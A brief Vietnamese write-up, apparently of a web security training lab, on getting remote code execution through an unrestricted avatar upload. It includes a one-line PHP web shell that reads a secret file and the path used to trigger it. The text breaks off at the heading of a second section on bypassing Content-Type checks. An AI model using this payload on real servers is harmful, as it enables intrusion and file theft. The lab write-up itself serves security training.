# 1. Remote code execution via web shell upload
Ta thấy chức năng upload avatar cho phép ta upload bất kì loại file nào. Như vậy ta thử upload file payload.php với nội dung:
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Sau khi upload file, ta truy cập `/files/avatars/payload.php` thì thấy nội dung file /home/carlos/secret đã được hiển thị:

![image](https://user-images.githubusercontent.com/103978452/202854734-8fa1c18b-4117-4a3c-b75e-547b67b16588.png)

# 2. Web shell upload via Content-Type restriction bypass
